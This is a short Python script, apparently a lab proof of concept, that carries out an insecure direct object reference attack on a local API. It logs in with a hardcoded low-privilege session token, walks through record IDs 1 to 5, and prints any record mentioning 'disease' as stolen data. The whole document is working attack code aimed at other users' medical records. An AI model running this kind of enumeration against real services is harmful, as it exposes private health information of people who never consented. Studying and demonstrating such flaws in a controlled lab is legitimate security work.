import requests

API_URL = "http://127.0.0.1:8001"

print("[*] Logging in as low-privileged user 'john'...")
token = "john_session"
headers = {"Authorization": token}

print("[*] Starting IDOR Attack... Attempting to extract records for IDs 1 to 5")

for i in range(1, 6):
    response = requests.get(f"{API_URL}/api/records/{i}", headers=headers)
    
    if "disease" in response.text:
        print(f"[!] VULNERABILITY FOUND! Stolen Data for User {i}: {response.json()}")
    else:
        print(f"[-] User {i} record not found or access denied.")